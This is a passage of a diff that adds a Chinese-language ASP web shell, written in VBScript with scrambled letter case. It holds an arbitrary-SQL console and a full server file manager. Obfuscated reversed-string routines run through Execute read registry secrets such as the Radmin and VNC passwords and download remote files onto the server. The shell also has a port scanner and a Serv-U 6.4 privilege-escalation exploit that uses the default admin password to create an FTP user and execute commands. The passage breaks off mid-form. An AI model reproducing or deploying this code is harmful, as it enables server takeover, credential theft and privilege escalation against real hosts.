+      SI=sI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&tNAMe&"]"",1)'>"&TnAMe&"</a></td>"
+    eND IF 
+    rS.mOveNExT 
+  lOOP 
+  SeT rS=nothiNg
+  si=SI&"</tr></table>"
+  RrS si:si=""
+If LEn(SQLsTR)>10 tHen
+  If LCaSe(lEfT(sQLstr,6))="select" Then
+    SI=Si&"执行语句："&sQLStr
+    set rs=cReatEobject("Adodb.Recordset")
+    rS.OPeN SqLsTR,cONn,1,1
+    Fn=RS.FIeLDs.cOUNT
+    RC=rS.rECoRDcOUnt
+    Rs.PaGesIZe=20
+    CounT=Rs.pagEsIze
+    pN=RS.pagECOuNT
+    page=rEqUesT("Page")
+    IF PAge<>"" TheN pAGE=ClNg(pAGe)
+    if PAge="" Or pAGE=0 TheN Page=1
+    if paGe>pN then page=PN
+    iF PaGe>1 tHEn rS.ABsoLUTepAGe=PaGE
+    Si=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
+    FoR n=0 to FN-1
+      SEt flD=rS.fIeldS.Item(n)
+      si=Si&"<td align='center'>"&fld.NAMe&"</td>"
+      set fLd=noTHinG
+    nEXt
+    sI=sI&"</tr>"
+    Do WhILe nOt(rs.Eof oR Rs.BOF) And COunt>0
+	  count=CounT-1
+	  bgcoLOR="#EFEFEF"
+	  SI=sI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
+	  FoR I=0 TO fn-1
+        IF bGCOlOR="#EFEFEF" tHEn:BgColoR="#F5F5F5":ELsE:BgcoLOR="#EFEFEF":EnD iF
+        iF rC=1 tHeN
+           COlInFO=HTmlencoDe(rS(I))
+        elsE
+           cOliNFO=HTmleNCode(lEft(rS(I),50))
+        eNd iF
+	    sI=SI&"<td bgcolor="&BGColOr&">"&cOlInFO&"</td>"
+	  NEXT
+	  sI=si&"</tr>"
+      Rs.movEnExT
+    LOOp
+	RRs SI:Si=""
+	sqLstR=HtMLEncodE(SqLStr)
+    sI=si&"<tr><td colspan="&fn+1&" align=center>记录数："&rC&"&nbsp;页码："&PAgE&"/"&Pn
+    If pn>1 THEN
+      si=si&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SQlstR&""","&PAge-1&")'>上一页</a>&nbsp;"
+      IF paGE>8 tHEn:sP=pagE-8:Else:SP=1:eND iF
+      for i=sp To sp+8
+        if i>pN THEn EXIt FOr
+        If i=pAgE theN
+        sI=si&I&"&nbsp;"
+        ELSE
+        sI=si&"<a href='javascript:FullSqlStr("""&sQLsTR&""","&i&")'>"&I&"</a>&nbsp;"
+        EnD iF
+      next
+	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""","&paGe+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&sQLstR&""","&pN&")'>尾页</a>"
+    End IF
+    si=sI&"<hr color='#EFEFEF'></td></tr></table>"
+    rS.CLOSe:Set rs=NotHiNG
+	rRs sI:si=""
+  elSe	   
+    CONN.ExecUtE(sqlSTR)
+    si=sI&"SQL语句："&SqLstr
+  EnD IF
+  Rrs si:Si=""
+enD if
+  CoNn.clOsE
+  Set COnN=NotHiNg
+  End If
+End Function
+
+DIm t1
+CLASS uPc
+  DIM d1,d2
+  pUBlic FunctIOn fOrM(f)
+    F=lCAsE(F)
+    if D1.EXiSTS(f) THEn:fOrM=D1(F):ELsE:fOrm="":End if
+  ENd fuNCTion
+  pUBLIc fuNcTiON UA(f)
+    F=lcASE(F)
+    If D2.EXIsTs(f) tHeN:SEt UA=d2(f):ElSe:set uA=neW fIF:End IF
+  end fUNCtion
+  pRIVATe sUB CLaSs_INitIALizE
+  dIM tDa,Tst,vBcRlF,tiN,diEnD,t2,TLen,tfl,sfv,FSTart,fEnD,dstArT,deNd,UpNAMe
+    SeT d1=cREateOBJECt(Obt(4,0))
+	If requESt.TOTalBYTes<1 THen ExiT suB
+    sEt T1 = crEateOBjECT(oBt(6,0))
+	T1.tYpe = 1 : t1.MODE =3 : T1.OPEn
+    T1.wrIte  REquESt.bINaryrEAd(rEqUEsT.tOtAlBytES)
+    t1.posITiON=0 : Tda =T1.ReAd : DsTarT = 1
+    Dend = LeNB(tDa)
+    seT d2=CReatEOBJECt(OBt(4,0))
+	VBcrlF = ChRB(13) & chrB(10)
+    SET t2 = CReAtEobjeCT(oBt(6,0))
+    Tst = MIdB(tdA,1, InStRB(DsTaRT,tdA,Vbcrlf)-1)
+    TlEN = LENb (Tst)
+    DSTArT=Dstart+TLeN+1
+    WhIlE (dstarT + 10) < dEND
+      diEND = instrB(DStArT,tdA,vBCRlf & vBcrlF)+3
+      T2.tYPE = 1 : T2.MODE =3 : t2.open
+      t1.PoSITIon = DStaRT
+      T1.CopyTo T2,DieNd-dStart
+      t2.POSITiOn = 0 : t2.tYPe = 2 : T2.cHARSet ="gb2312"
+      TIN = t2.reAdTexT : T2.CLOSe
+      DStart = inStRB(dieNd,TDA,tSt)
+      FStarT = INsTR(22,tiN,"name=""",1)+6
+      fEND = INstr(FSTART,tiN,"""",1)
+      uPnAme = LCaSe(MId (TIn,FsTarT,FENd-FstArT))
+      iF INstr (45,tin,"filename=""",1) > 0 tHeN
+        Set Tfl=nEW FIf
+        FsTART = iNStR(Fend,tin,"filename=""",1)+10
+        FENd = INSTr(fstarT,TIn,"""",1)
+        fstaRt = insTr(FEnd,TIN,"Content-Type: ",1)+14
+        FEnD = iNStr(FSTArT,tIN,VbCR)
+        tfl.FiLesTart =dienD
+        TFl.FIlESIzE = dSTArt -DienD -3
+        iF noT D2.eXiSTS(UPnAmE) TheN
+          D2.aDD uPNAmE,tFl
+        eND iF
+      else
+        T2.tyPE =1 : T2.MOdE =3 : t2.Open
+        T1.PositiOn = DieND : t1.coPytO T2,dstArt-dIeND-3
+        t2.POSitIoN = 0 : t2.tyPe = 2
+        t2.CHaRSET ="gb2312"
+        SFv = T2.ReadtexT
+        T2.CLOse
+        If d1.eXiStS(UPnAME) theN
+          D1(UpnAMe)=d1(UPnamE)&", "&SfV
+        ELse
+          d1.Add UPNAmE,sfv
+        ENd If
+      ENd iF
+      dsTart=DstarT+tLeN+1
+    wENd
+    Tda=""
+    Set T2 =nothinG
+  End SuB
+  pRIVATE SuB CLasS_tErminATe
+    IF rEQUeST.ToTaLbyTes>0 THEn
+      D1.remOvEAll:d2.RemoVEAll
+      sEt D1=NOthIng:sEt D2=nothinG
+      T1.cLOsE:SeT T1 =NOtHIng
+    end iF
+  END SuB
+EnD Class
+ClAsS Fif
+dIm FileSIzE,FilEStART
+  pRiVAtE suB ClasS_INITiAliZe
+  fILesiZE = 0
+  filesTaRT= 0
+  ENd sub
+  pUBlIc fUnctiOn sAvEAs(F)
+  dim t3
+  Saveas=tRUe
+  IF tRim(f)="" OR filestArt=0 THEN exIT FUNcTIOn
+  sET t3=crEAteobjECt(oBT(6,0))
+     t3.moDe=3 : t3.tyPe=1 : T3.OPEn
+     T1.PoSiTIoN=fiLeStarT
+     t1.copyTo T3,fILEsIZE
+     t3.SAVeTofILE f,2
+     T3.ClOsE
+     sEt T3=NOthiNg
+     saVeas=fAlSE
+   ENd FunCtIon
+End claSs
+cLASS Lbf
+  DIm CF
+  PrIVate suB class_InitIALIZe
+    sEt cf=cReAtEoBjeCt(Obt(0,0))
+  enD sUB
+  PrIvATe Sub cLass_TERMInAte
+    sET cf=NOtHINg
+  end sUB
+  fUNCTion shoWDrIVeR()
+    For EaCH d In cF.drIves
+      rRs"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.drIvELetTer&":\\"")'>本地磁盘 ("&D.dRIvELEtteR&":)</a><br>" 
+    nexT
+  ENd fUncTIOn
+  funcTiOn shOW1fiLE(PAth)
+  SeT FOlD=cF.GeTFOlDeR(pAth)
+  I=0
+    si="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
+  fOR EACH f IN FOLD.suBFOlDERS
+    Si=sI&"<td height=10>"
+    si=Si&"<a href='javascript:ShowFolder("""&repaTh(PATh&"\"&F.name)&""")' title=""打开""><font face='wingdings' size='6'>0</font>"&F.NaMe&"</a>" 
+	SI=sI&" _<a href='javascript:FullForm("""&REpaTh(pATh&"\"&f.nAME)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a>"
+    sI=Si&"  <a href='javascript:FullForm("""&rEPlACe(pATh&"\"&f.nAME,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='删除'>Del</a>"
+	SI=SI&" <a href='javascript:FullForm("""&repatH(PaTH&"\"&f.naME)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='移动'>Move</a>"
+	Si=SI&" <a href='javascript:FullForm("""&rEPAth(paTH&"\"&F.NaMe)&""",""DownFile"")'  onclick='return yesok()' class='am' title='下载'>Down</a></td>"
+	i=i+1
+    If I MOd 3 = 0 TheN SI=si&"</tr><tr>"
+  neXt
+    si=Si&"</tr><tr><td height=2></td></tr></table>"
+	RrS SI &"<hr noshade size=1 color=""#"" />" : sI=""
+  fOr eacH L IN FoLd.FILEs
+    Si="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
+    si=SI&"<tr style='boungroup-color:#'>"
+	sI=Si&"<td height='30'><a href='javascript:FullForm("""&REpath(PAth&"\"&l.naMe)&""",""DownFile"");' title='下载'><font face='wingdings' size='4'>2</font>"&L.nAMe&"</a></td>"
+    Si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePATH(Path&"\"&L.NamE)&""",""EditFile"")' class='am' title='编辑'>edit</a></td>"
+	sI=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePAth(PATH&"\"&l.naMe)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>del</a></td>"
+	si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RepatH(PAtH&"\"&l.NAME)&""",""CopyFile"")' class='am' title='复制'>copy</a></td>"
+	si=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&REpaTh(PatH&"\"&l.namE)&""",""MoveFile"")' class='am' title='移动'>move</a></td>"	
+    Si=Si&"<td width='50' align=""center"">"&ClNG(l.SiZe/1024)&"K</td>"
+	sI=sI&"<td width='200' align=""center"">"&l.TyPe&"</td>"
+    SI=sI&"<td width='160'>"&l.DATElAStmoDIfIed&"</td>"
+    sI=sI&"</tr></table>"
+	rRs si:Si=""
+  nExt
+  sEt FOlD=NoTHIng
+  EnD fUNctiON
+  fuNcTiOn DeLFilE(pATh)
+IF cf.fIlEexIsts(paTh) then
+Cf.DelEtEFile paTh
+sI="<center><br><br><br>文件 "&pATH&" 删除成功！</center>"
+Si=Si&BaCkURL
+RRS Si
+EnD iF
+End Function
+
+Function EDitfIlE(path)
+if reqUest("Action2")="Post" then
+SeT T=Cf.cReAteTExtFiLe(paTH)
+T.wrIteLinE ReQUEsT.FoRM("content")
+T.CLoSE
+Set T=NOTHinG
+sI="<center><br><br><br>文件保存成功！</center>"
+sI=si&baCKurl
+Rrs si
+ResPonse.eNd
+end IF
+IF pAtH<>"" then
+Set T=cF.OpENTeXTfiLe(pATH, 1, fAlSE)
+TxT=htmLencoDE(t.rEaDaLL) 
+T.cLOSe
+SeT t=nothing
+elSe
+path=sesSIOn("FolderPath")&"\newfile.asp":Txt="新建文件"
+End If
+sI=si&"<Form action='"&Url&"?Action2=Post' method='post' name='EditForm'>"
+si=si&"<input name='Action' value='EditFile' Type='hidden'>"
+Si=sI&"<input name='FName' value='"&patH&"' style='width:100%'><br>"
+si=sI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
+si=si&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
+rRS si
+  EnD fuNCTiON
+  fuNctiON CoPyfILe(pATh)
+  pAth = SPLIT(pAtH,"||||")
+    If cF.FileExiSTS(PAth(0)) ANd path(1)<>"" THEN
+	  cF.copYFIlE patH(0),pATH(1)
+      si="<center><br><br><br>文件"&patH(0)&"复制成功！</center>"
+      SI=si&backurL
+	  rrs sI 
+	enD IF
+  eND fUnCTIOn
+  FuNctioN movEFiLE(PaTh)
+  PaTh = SPlit(patH,"||||")
+    if cF.FIleExIstS(pATh(0)) ANd path(1)<>"" THEN
+	  Cf.mOVEfILe pAth(0),pAth(1)
+      Si="<center><br><br><br>文件"&paTh(0)&"移动成功！</center>"
+      Si=SI&baCkuRl
+	  RrS Si 
+	eND If
+  EnD FuNCtioN
+  FUNCtiON DELFoLdeR(pATh)
+    If cF.FolderExists(PATH) THEn
+	  cF.DELetefOlDeR paTH
+      si="<center><br><br><br>目录"&paTH&"删除成功！</center>"
+      Si=Si&BacKuRl
+	  rrs sI
+	End if
+  end fUNCtiOn
+  FunCTiON cOPYFolDER(PatH)
+  pAtH = SpliT(PAth,"||||")
+    iF cf.FolderExists(paTh(0)) anD PATh(1)<>"" ThEn
+	  cF.CopYFOlDEr paTh(0),pAth(1)
+      si="<center><br><br><br>目录"&Path(0)&"复制成功！</center>"
+      si=si&BaCkUrl
+	  rrS si
+	END iF
+  END fUncTIoN
+  FUnctION MOvEfolDER(PATh)
+  Path = SPlIt(PAth,"||||")
+    iF cf.FolderExists(paTH(0)) And Path(1)<>"" tHEN
+	  CF.MoVeFOLDeR pATh(0),patH(1)
+      Si="<center><br><br><br>目录"&Path(0)&"移动成功！</center>"
+      sI=sI&BaCKURL
+	  rrs Si
+	END if
+ENd Function
+  FuNcTiON NEWfoLder(PaTh)
+    iF noT cF.FolDERexists(pATH) and pAth<>"" tHEN
+	  Cf.CreATeFOldER PatH
+      SI="<center><br><br><br>目录"&PATH&"新建成功！</center>"
+      si=SI&baCkurl
+	  rRs sI
+	END If
+  eNd FUNCtION
+End CLAsS
+sub shellcore
+end sub
+
+
+Sub ReadReg()
+ShiSan="╋╋fi dnE╋fI dnE╋yarrAeht & ╁>il<╁SrR╋eslE ╋txeN╋)i(yarrAeht & ╁>il<╁SrR╋)yarrAeht(dnuoBU oT 0=i roF╋nehT )yarrAeht(yarrAsI fI╋)htaPeht(daeRgeR.Xsw=yarrAeht╋)╁htaPeht╁(tseuqeR=htaPeht╋)╁llehS.tpircSW╁(tcejbOetaerC.revreS = Xsw teS╋txeN emuseR rorrE nO╋neht ╁╁><)╁htaPeht╁(tseuqeR fi╋╁>/rh<>mrof/<╁SrR╋╁>naps/<╁SrR╋╁>/rh<>';enon:yalpsid'=elyts ofnItideger=di naps<╁SrR╋╁>rb<>/rb<})换替的面上把(列序的卡网前当{ dniB\egakniL\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁SrR╋╁>p/<>p<>rb<>/rb<}卡网动活块几共{ tnuoC\munE\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁SrR╋╁>p/<>p<>/rb<--------------------REVO-----------╁SrR╋╁>rb<>/rb<}口端PDU的许允{ stroPdewollAPDU\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}口端PI/PCT的许允{ stroPdewollAPCT\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}SND首{ revreSemaN\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\teSlortnoCtnerruC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}关网认默{ ZS_ITUM_GER,yawetaGtluafeD\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\teSlortnoCtnerruC\METSYS\MLKH╁SrR╋╁>p/<>p<>/rb<---------确准否是道知不,卡网的定绑看要乎似下以-------╁SrR╋╁>rb<>/rb<}由路PI许允{ 1,DROWD_GER,retuoRelbanEPI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁SrR╋╁>rb<>/rb<})器配试有所(选筛PI/PCT用启{ 1,DROWD_GER,sretliFytiruceSelbanE\sretemaraP\pipcT\secivreS\teSlortnoCtnerruc\METSYS\MLKH╁SrR╋╁>rb<>/rb<}享共络网闭关{ 0,ZS_GER,sevirDteNderahSelbanE\sretemaraP\revreSnamnaL\secivreS\teSlortnoCtnerruC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}享共认默止禁{ 0,DROWD_GER,revreSerahSotuA\sretemaraP\revreSnamnaL\secivreS\teSlortnoCtnerruC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}享共$CPI机本接连法无户用名匿=2,表列户用机本举列法无户用名匿=1,省缺=0{ 0,DROWD_GER,suomynonatcirtser\asL\lortnoC\teSlortnoCtnerruC\METSYS\MLKH╁SrR╋╁>rb<>/rb<}户用录登次上示显不{ 1,ZS_GER,emaNresUtsaLyalpsiD-tnoD\nogolniW\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH╁SrR╋╁>rb<>rb<>rb<  >' 码密nimdaR取读 '=eulav timbus=epyt tupni< ╁SrR╋╁>neddih=epyt 08=ezis 'nimdAR\METSYS\ENIHCAM_LACOL_YEKH'=eulav nimdar=eman tupni<╁SrR╋╁>nimdar=eman geRdaer=eulav neddih=epyt tupni<╁SrR╋╁  >' 码密CNV取读 '=eulav timbus=epyt tupni< ╁SrR╋╁>neddih=epyt 08=ezis 'drowssaP\3CNVniW\LRO\erawtfoS\UCKH'=eulav cnv=eman tupni<╁SrR╋╁>cnv=eman cnv=eulav neddih=epyt tupni<╁SrR╋╁>rb<>rb<>' 取读 '=eulav timbus=epyt tupni< ╁SrR╋╁>08=ezis 'emaNretupmoC\emaNretupmoC\emaNretupmoC\lortnoC\teSlortnoCtnerruC\METSYS\MLKH'=eulav htaPeht=eman tupni<╁SrR╋╁>tcAeht=eman geRdaer=eulav neddih=epyt tupni<╁SrR╋╁>tsop=dohtem mrof<╁SrR╋╁>/rh<:取读值键表册注╁SrR"
+ExeCuTe(ShiSanFun(ShiSan))
+End Sub
+Sub ScanPort()
+SERveR.ScrIPtTIMeouT = 7776000
+IF REQuesT.fORM("port")="" theN
+PoRTliST="21,1433,3389,43958"
+ELse
+portList=RequeST.form("port")
+End If
+iF rEqUEST.forM("ip")="" tHEn
+iP="127.0.0.1"
+ELse
+ip=ReQuEST.FOrM("ip")
+eND iF
+rrs"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p>"
+rrs"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
+rRs"<p>Scan IP:&nbsp;"
+rrs" <input name='ip' type='text' class='TextBox' id='ip' value='"&Ip&"' size='60'>"
+rRS"<br>Port List:"
+rrs"<input name='port' type='text' class='TextBox' size='60' value='"&pORTLiSt&"'>"
+rrS"<br><br>"
+rrs"<input name='submit' type='submit' class='buttom' value='开始扫描'>"
+RRS"<input name='scan' type='hidden' id='scan' value='111'>"
+rRS"</p></form>"
+iF rEqUeST.fORM("scan") <> "" tHen
+tiMer1 = timeR
+Rrs("<b>扫描报告:</b><br><hr>")
+Tmp = SpLIt(rEQUest.foRm("port"),",")
+Ip = spLit(REQuEST.fORM("ip"),",")
+for HU = 0 tO ubOunD(iP)
+if iNSTr(iP(Hu),"-") = 0 TheN
+fOR i = 0 to uBoUNd(tMP)
+if ISNUMERIc(TMp(I)) then 
+CAll scAn(Ip(hU), TMP(I))
+ELse
+SeeKx = iNsTr(tmP(i), "-")
+IF sEeKx > 0 THen
+stARtN = LEfT(tMP(I), seeKX - 1 )
+eNDN = rigHt(TMP(i), lEn(TmP(i)) - SeEkX )
+iF IsNUMeRIc(StarTN) And IsNuMeRic(enDN) THEN
+for J = STARTn to ENdn
+cALl scan(ip(hu), j)
+NEXT
+elsE
+RRs(StArTn & " or " & EnDN & " is not number<br>")
+End If
+eLSe
+RRS(tMP(i) & " is not number<br>")
+EnD IF
+End IF
+NExt
+Else
+iPStaRt = MID(iP(hu),1,InstRREV(Ip(hu),"."))
+fOr xxX = mid(ip(hU),inSTrreV(ip(hu),".")+1,1) To MId(ip(hu),INstR(Ip(Hu),"-")+1,LEN(ip(hU))-inStr(ip(Hu),"-"))
+fOR I = 0 TO UboUnD(Tmp)
+if isnumErIC(tMP(I)) TheN 
+Call sCAn(iPsTart & xXX, TMp(i))
+ElsE
+SeEkX = insTr(tMP(i), "-")
+If SeeKx > 0 ThEn
+StArTN = leFt(tmP(I), seeKx - 1 )
+enDn = riGHT(TMp(i), LEn(tMp(I)) - sEEKx )
+if isNuMeRIC(staRtN) And isNumeRic(EndN) THEn
+foR j = StArTn TO endn
+caLl SCaN(IPstARt & xxX,j)
+NExt
+eLse
+RRs(STaRTn & " or " & EndN & " is not number<br>")
+END if
+eLsE
+rRs(Tmp(i) & " is not number<br>")
+eND If
+END if
+neXt
+Next
+END if
+next
+TIMER2 = timER
+tHetImE=CStr(INt(TIMEr2-TImEr1))
+rRS"<hr>Process in "&TheTImE&" s"
+EnD iF
+enD suB
+suB SCAN(TaRgETIP, poRTnUM)
+	oN error ReSUMe nExt
+	set coNN = sERvEr.createObJect("ADODB.connection")
+	ConnstR="Provider=SQLOLEDB.1;Data Source=" & tARgETIp &","& PoRtNUm &";User ID=lake2;Password=;"
+	CoNN.COnNECtiOnTImeout = 1
+	CONn.OPen coNNSTr
+	If err tHeN
+		if ERr.NuMbEr = -2147217843 or eRR.NUmBer = -2147467259 Then
+			If INStr(err.dEsCriptIoN, "(Connect()).") > 0 THEn
+				RrS(taRgEtIP & ":" & pORtnuM & ".........关闭<br>")
+			ELSE
+				RRs(TarGETIP & ":" & pOrTNum & ".........<font color=red>开放</font><br>")
+			enD IF
+		enD iF
+	END if
+eND sUB
+
+Function Upload()
+ShiSan="╋fI dnE╋txeN emuseR rorrE nO╋nehT eslaF = edoMgubeDsi fI╋gnihtoN = maertS teS╋gnihtoN = pttH teS╋		)rrE(rrEkhC╋htiW dnE╋esolC.╋fI dnE╋etirWrevo ,htaPeht eliFoTevaS.╋emaNelif & ╁\╁ & htaPeht = htaPeht╋fI dnE╋╁txt.mth.xedni╁ = emaNelif╋nehT ╁╁ = emaNelif fI╋)))╁/╁ ,lrUeht(tilpS(dnuoBU()╁/╁ ,lrUeht(tilpS = emaNelif╋raelC.rrE╋nehT 4003 = rebmuN.rrE fI╋etirWrevo ,htaPeht eliFoTevaS.╋0 = noitisoP.╋ydoBesnopseR.pttH etirW.╋nepO.╋3 = edoM.╋1 = epyT.╋maerts htiW╋	fI dnE╋ nehT 4 >< etatSydaeR.pttH fI╋)(dneS.pttH╋eslaF ,lrUeht ,╁TEG╁ nepO.pttH╋	fI dnE╋1 = etirWrevo╋nehT 2 >< etirWrevo fI╋)╁PTTHLMX.2LMXSM╁(tcejbOetaerC.revreS = pttH teS╋)╁maer╁&e&╁ts.bdo╁&e&╁da╁(tcejbOetaerC.revreS = maerts teS╋)╁etirWrevo╁(tseuqeR = etirWrevo╋)╁htaPeht╁(tseuqeR = htaPeht╋)╁lrUeht╁(tseuqeR = lrUeht╋etirWrevo ,emaNelif ,maerts ,htaPeht ,lrUeht ,pttH miD╋fI dnE╋txeN emuseR rorrE nO╋nehT eslaF = edoMgubeDsi fI╋╁>/rh<╁ SRR╋╁>mrof/<╁ SRR╋╁>tcAeht=eman lrUmorFnwod=eulav neddih=epyt tupni<╁ SRR╋╁盖覆在存>2=eulav etirWrevo=eman xobkcehc=epyt tupni<╁ SRR╋╁>08=ezis ╁╁╁ & ))╁.╁(htaPpaM.revreS(edocnElmtH & ╁╁╁=eulav htaPeht=eman tupni<╁ SRR╋╁>/rb<>' 载下 '=eulav timbus=epyt tupni<>08=ezis '//:ptth'=eulav lrUeht=eman tupni<╁ SRR╋╁>tsop=dohtem mrof<╁ SRR╋╁>/rh<:器务服到源资载下╁ SRR╋ ╁>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<╁=iS"
+ExeCuTe(ShiSanFun(ShiSan))
+
+End Function
+
+
+sEleCt cASe aCtiON
+  CasE "MainMenu":MAInMEnu()
+  CASE "GetTerminalInfo":GetTerminalInfo()
+  CAse "PageAddToMdb":paGEaddtoMdB()
+  cASE "ScanPort":SCAnPoRt()
+  Case "Servu"
+  
+SUaction=request("SUaction")
+if  not isnumeric(SUaction) then response.end
+user = trim(request("u"))
+pass = trim(request("p"))
+port = trim(request("port"))
+cmd = trim(request("c"))
+f=trim(request("f"))
+if f="" then
+f=gpath()
+else
+   f=left(f,2)
+end if
+ftpport = 65500
+timeout=3
+loginuser = "User " & user & vbCrLf
+loginpass = "Pass " & pass & vbCrLf
+deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
+mt = "SITE MAINTENANCE" & vbCrLf
+newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=M_Schumacher|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
+newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
+        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
+        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
+        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
+        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
+        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
+        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
+quit = "QUIT" & vbCrLf
+newuser=replace(newuser,"c:",f)
+select case SUaction
+case 1
+set a=Server.CreateObject("Microsoft.XMLHTTP")
+a.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s1",True, "", ""
+a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
+set session("a")=a
+RRS"<form method='post' name='M_Schumacher'>"
+RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
+RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
+RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
+RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
+RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
+RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
+RRS"<script language='javascript'>"
+RRS"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
+RRS"setTimeout('document.all.M_Schumacher.submit();',4000);"
+RRS"</script>"
+case 2
+set b=Server.CreateObject("Microsoft.XMLHTTP")
+b.open "GET", "http://127.0.0.1:" & ftpport & "/M_Schumacher/upadmin/s2", True, "", ""
+b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
+ set session("b")=b
+RRS"<form method='post' name='M_Schumacher'>"
+RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
+RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
+RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
+RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
+RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
+RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
+RRS"<script language='javascript'>"
+RRS"document.write('<center>正在提升权限,请等待...,<center>');"
+RRS"setTimeout(""document.all.M_Schumacher.submit();"",4000);"
+RRS"</script>"
+case 3
+set c=Server.CreateObject("Microsoft.XMLHTTP")
+c.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s3", True, "", ""
+c.send loginuser & loginpass & mt & deldomain & quit
+set session("c")=c
+RRS"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
+RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
+RRS"</center>"
+case else
+on error resume next
+    set a=session("a")
+    set b=session("b")
+    set c=session("c")
+    a.abort
+    Set a = Nothing
+    b.abort
+    Set b = Nothing
+    c.abort
+    Set c = Nothing
+RRS"<center><form method='post' name='M_Schumacher'>"
+RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
+RRS"<tr align='center' valign='middle'>"
+RRS"<td colspan='2'>Serv-U 提升权限 6.4</td>"
+RRS"</tr>"
+RRS"<tr align='center' valign='middle'>"
+RRS"<td width='100'>用户名:</td>"
+RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
+RRS"</tr>"
+RRS"<tr align='center' valign='middle'>"
+RRS"<td>口 令：</td>"
+RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
+RRS"</tr>"
+RRS"<tr align='center' valign='middle'>"
